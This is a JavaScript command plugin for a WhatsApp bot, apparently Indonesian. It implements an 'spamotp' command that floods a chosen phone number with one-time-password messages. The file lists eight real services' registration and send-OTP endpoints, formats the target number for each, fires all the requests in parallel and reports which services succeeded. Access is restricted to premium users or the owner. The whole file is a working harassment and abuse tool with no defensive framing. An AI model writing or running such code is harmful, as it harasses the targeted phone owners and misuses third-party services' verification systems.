import axios from 'axios'

function formatPhone(text) {
    let phone = text.replace(/[^0-9]/g, '')
    if (phone.startsWith('0')) phone = '62' + phone.slice(1)
    if (!phone.startsWith('62')) phone = '62' + phone
    return phone
}

function buildEndpoints(p08, p62, b) {
    return [
        {
            name: 'Internet Rakyat',
            url: 'https://internetrakyat.id/api/app/auth/send-otp-register',
            data: { phone_number: p08 },
            headers: process.env.INTERNETRAKYAT_API_KEY ? { 'x-api-key': process.env.INTERNETRAKYAT_API_KEY } : {}
        },
        {
            name: 'Bonus Belanja',
            url: 'https://www.bonusbelanja.com/api/auth/registration/app',
            data: { phone: p62, name: 'user', agreeTnc: true, agreeContact: false }
        },
        {
            name: 'Alodokter',
            url: 'https://www.alodokter.com/resend-otp',
            data: {
                user: { phone: p08, uuid: 'f6bd0911-888f-4b3d-b189-2edf0e8e5e4e' },
                request_via: 'whatsapp'
            }
        },
        {
            name: 'Beautyhaul',
            url: 'https://www.beautyhaul.com/ajax/account/send_otp',
            data: { method: 'WhatsApp', phone: p62 }
        },
        {
            name: 'Saturdays',
            url: 'https://beta.api.saturdays.com/api/v1/user/otp/send',
            data: { number: b, country_code: '+62', type: '' },
            headers: { ...(process.env.SATURDAYS_API_KEY ? { 'x-api-key': process.env.SATURDAYS_API_KEY } : {}), 'country-code': 'ID' }
        },
        {
            name: 'KTBS',
            url: `https://core.ktbs.io/v2/user/registration/otp/${p08}`,
            method: 'GET'
        },
        {
            name: 'Klik Indomaret',
            url: `https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=${p08}`,
            method: 'GET',
            headers: { 'Origin': 'https://account.klikindomaret.com' }
        },
        {
            name: 'Jag Reward',
            url: `https://id.jagreward.com/member/verify-mobile/${b}/`,
            method: 'GET',
            headers: { 'X-Requested-With': 'XMLHttpRequest' }
        }
    ]
}

async function sendRequest(endpoint) {
    const config = {
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            ...(endpoint.headers || {})
        },
        timeout: 10000,
        validateStatus: () => true
    }

    try {
        let response
        if (endpoint.method === 'GET') {
            response = await axios.get(endpoint.url, config)
        } else {
            response = await axios.post(endpoint.url, endpoint.data, config)
        }

        return { success: response.status === 200 || response.status === 201, status: response.status }
    } catch {
        return { success: false, status: 0 }
    }
}

async function sendAllRequests(endpoints) {
    const results = await Promise.allSettled(
        endpoints.map(async (ep, index) => {
            const result = await sendRequest(ep)
            return { ...result, index, name: ep.name }
        })
    )

    let success = 0
    let failed = 0
    const details = []

    for (const result of results) {
        if (result.status === 'fulfilled' && result.value.success) {
            success++
            details.push({ name: result.value.name, success: true })
        } else {
            failed++
            details.push({ name: result.value?.name || 'Unknown', success: false })
        }
    }

    return { success, failed, total: endpoints.length, details }
}

export default {
    cmd: ['spamotp', 'otp'],
    category: 'tools',
    description: 'Kirim spam OTP ke nomor target',

    run: async (m, { sock, text, prefix, cmd, isOwner }) => {
        const user = global.db?.data?.users?.[m.sender]
        const isPremium = user?.premium && user?.premiumTime > Date.now()

        if (!isPremium && !isOwner) {
            return m.reply('Fitur ini khusus untuk user *Premium* atau *Owner*.')
        }

        if (!text) {
            return m.reply(
                `*Spam OTP*\n\n` +
                `*Cara pakai:*\n` +
                `${prefix}${cmd} 628xxxx\n\n` +
                `*Contoh:*\n` +
                `${prefix}${cmd} 628123456789`
            )
        }

        const phone = formatPhone(text)
        const p08 = '0' + phone.slice(2)
        const p62 = phone
        const b = phone.replace('62', '')

        if (b.length < 8 || b.length > 13) {
            return m.reply('Nomor tidak valid.')
        }

        const endpoints = buildEndpoints(p08, p62, b)

        await m.react('⏳')
        await m.reply(`Mengirim spam OTP ke *${p62}*...\n\nTotal layanan: ${endpoints.length}`)

        const result = await sendAllRequests(endpoints)

        let response = `*Hasil Spam OTP*\n\n`
        response += `Nomor: ${p62}\n`
        response += `Berhasil: ${result.success}/${result.total}\n\n`

        if (result.details.length > 0) {
            const successList = result.details.filter(d => d.success)
            const failedList = result.details.filter(d => !d.success)

            if (successList.length > 0) {
                response += `*Layanan Berhasil:*\n`
                successList.forEach(d => { response += `  ✅ ${d.name}\n` })
            }
            if (failedList.length > 0) {
                response += `\n*Layanan Gagal:*\n`
                failedList.forEach(d => { response += `  ❌ ${d.name}\n` })
            }
        }

        await m.react('✅')
        return m.reply(response)
    }
}